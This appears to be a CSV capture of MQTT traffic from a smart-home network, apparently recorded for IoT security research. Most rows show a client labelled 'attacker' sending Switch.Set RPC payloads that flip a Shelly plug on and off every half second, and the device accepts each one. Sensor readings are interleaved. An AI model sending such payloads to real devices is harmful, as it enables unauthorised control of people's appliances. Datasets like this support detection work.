timestamp,topic,payload_size_bytes,payload_preview
2026-04-22T16:19:54,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4059 33327.023 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:54,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:54,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33327.02,""swi"
2026-04-22T16:19:54,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4060 33327.040 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:54,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:19:54,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:19:54,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:54,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:54,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4061 33327.524 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:54,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:54,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33327.52,""swi"
2026-04-22T16:19:54,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4062 33327.542 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:55,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:55,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:55,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4063 33328.025 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:55,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:55,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33328.02,""swi"
2026-04-22T16:19:55,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4064 33328.041 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:55,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:55,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:55,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4065 33328.530 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:55,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:55,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33328.53,""swi"
2026-04-22T16:19:55,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4066 33328.549 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:56,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:56,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:56,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4067 33329.031 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:56,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:56,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33329.03,""swi"
2026-04-22T16:19:56,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4068 33329.047 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:56,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:19:56,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:19:56,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:19:56,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:19:56,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:19:56,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:56,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:56,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4069 33329.531 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:56,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:56,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33329.53,""swi"
2026-04-22T16:19:56,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4070 33329.549 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:57,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:57,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:57,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4071 33330.034 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:57,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:57,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33330.03,""swi"
2026-04-22T16:19:57,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4072 33330.051 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:57,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:57,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:57,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4073 33330.534 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:57,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:57,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33330.53,""swi"
2026-04-22T16:19:57,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4074 33330.552 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:58,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:58,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:58,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4075 33331.033 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:58,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:58,iot/pir/binary_sensor/motion/state,3,OFF
2026-04-22T16:19:58,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33331.03,""swi"
2026-04-22T16:19:58,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4076 33331.050 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:58,iot/pir/debug,50,[0;36m[D][binary_sensor:048]: 'Motion' >> OFF[0m
2026-04-22T16:19:58,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:58,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:58,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4077 33331.533 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:58,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:58,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33331.53,""swi"
2026-04-22T16:19:58,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4078 33331.552 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:59,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:59,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:59,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4079 33332.034 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:59,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:59,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33332.03,""swi"
2026-04-22T16:19:59,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4080 33332.051 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:59,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:19:59,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:19:59,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:59,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:59,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4081 33332.534 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:59,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:59,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33332.53,""swi"
2026-04-22T16:19:59,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4082 33332.553 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:20:00,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:20:00,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:20:00,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4083 33333.034 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:20:00,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:20:00,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33333.03,""swi"
2026-04-22T16:20:00,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4084 33333.051 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:20:00,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:20:00,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:20:00,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4085 33333.535 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:20:00,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:20:00,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33333.53,""swi"
2026-04-22T16:20:00,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4086 33333.554 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:20:01,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:20:01,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:20:01,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4087 33334.036 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:20:01,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:20:01,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33334.03,""swi"
2026-04-22T16:20:01,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4088 33334.052 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:20:01,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:20:01,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:20:01,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4089 33334.538 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:20:01,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:20:01,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33334.53,""swi"
2026-04-22T16:20:01,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4090 33334.557 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:20:02,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:20:02,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:20:02,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4091 33335.037 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:20:02,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:20:02,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33335.03,""swi"
2026-04-22T16:20:02,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4092 33335.053 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:20:02,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:20:02,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:20:02,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4093 33335.538 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:20:02,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:20:02,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33335.54,""swi"
2026-04-22T16:20:02,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4094 33335.557 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:20:03,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:20:03,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:20:03,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4095 33336.038 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:20:03,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:20:03,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33336.04,""swi"
2026-04-22T16:20:03,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4096 33336.055 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:20:03,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:20:03,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:20:03,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4097 33336.539 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
